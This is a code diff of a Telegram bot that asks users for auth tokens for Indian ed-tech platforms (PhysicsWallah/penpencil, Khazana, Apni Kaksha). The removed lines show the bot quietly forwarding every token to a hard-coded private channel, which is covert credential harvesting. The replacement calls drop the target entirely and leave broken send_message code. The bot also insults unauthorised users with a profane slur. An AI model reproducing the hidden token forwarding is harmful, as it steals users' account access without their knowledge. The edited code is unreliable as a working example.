@@ -1052,7 +1052,7 @@ async def accounpwlwogin(bot: Client, m: Message):
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
     await bot.send_message(
-        -1002133225459, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
+        f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
     )
     headers = {
         "Host": "api.penpencil.co",
@@ -1291,8 +1291,7 @@ async def khazanan(bot: Client, m: Message):
     )
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
-    await bot.send_message(
-        -1002133225459, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
+    await bot.send_message(f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
     )
     headers = {
         "Host": "api.penpencil.xyz",
@@ -1320,8 +1319,7 @@ async def khazanan(bot: Client, m: Message):
     await m.reply_text("**Now send the Code**")
     input2 = message = await bot.listen(editable.chat.id)
     raw_text2 = input2.text
-    await bot.send_message(
-        -1002133225459, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`"
+    await bot.send_message(f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`"
     )
     response2 = requests.get(
         f"https://api.penpencil.co/v1/programs/{raw_text2}/subjects", headers=headers
@@ -1476,8 +1474,7 @@ async def apnissn(bot: Client, m: Message):
     )
     input1 = await bot.listen(editable.chat.id)
     token = input1.text
-    await bot.send_message(
-        -1002133225459, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
+    await bot.send_message(f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
     )
     headers1 = {
         "Host": "spec.apnikaksha.net",
@@ -1717,7 +1714,7 @@ async def account_ln(bot: Client, m: Message):
 
 
 @bot.on_message(filters.command(["pro_vision"]))
-async def pro_visooin(bot: Client, m: Message):
+async def pro_vision(bot: Client, m: Message):
     user = m.from_user.id if m.from_user is not None else None
     if user is not None and user not in sudo_users:
         await m.reply("bhag bhosadi ke", quote=True)
